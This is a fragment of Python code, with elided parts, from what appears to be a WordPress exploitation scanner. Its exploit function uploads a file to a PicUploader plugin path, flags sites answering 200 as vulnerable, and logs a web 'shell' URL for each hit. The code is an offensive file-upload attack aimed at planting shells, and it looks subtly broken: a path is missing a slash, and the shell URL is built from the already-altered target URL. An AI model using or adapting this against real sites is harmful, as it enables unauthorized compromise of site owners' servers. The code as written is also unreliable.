...
def exploit(url):
    ...
    try:
        ...
        url = "{}/wp-content/pluginsPicUploader-master/index.php".format(url)
        r = req.post(url, files=files)
        if r.status_code == 200:
            print(colors.yellow + "[+] ==> Pic Upload %s Vulnerable" % url)
            found.append({
                "url": url,
                "payload": r.url,
                "status": r.status_code,
                "exploit": "upload_exploit",
                "shell": "http://{}/wp-content/plugins/PicUploader/file.jpg".format(url)
            })
            json_me(url, "upload_exploit", found)
        else:
            print(colors.red + "[-] Pic Upload ==> %s Not Vulnerable" % url)
